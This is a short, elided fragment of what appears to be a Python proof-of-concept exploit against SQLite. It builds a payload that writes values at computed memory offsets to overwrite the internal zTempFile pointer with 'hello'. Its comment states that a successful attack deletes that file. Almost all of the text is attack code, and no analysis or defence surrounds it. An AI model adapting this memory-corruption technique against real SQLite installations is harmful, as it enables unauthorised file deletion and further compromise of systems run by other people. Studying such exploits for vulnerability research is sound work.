...
'''
The attack needs to set p->zTempFile to "hello"
If the attack is successful, the file "hello" will be deleted
'''
...
exp = writeVal(exp, sqlite3_value_off + 0x40, zTempFile, 8)
...
exp = writeVal(exp, src_off, src_base + 0x8, 8)

# add a src string ";hello"
exp = writeVal(exp, src_off + 0x8, 0x6f6c6c6568, 6)
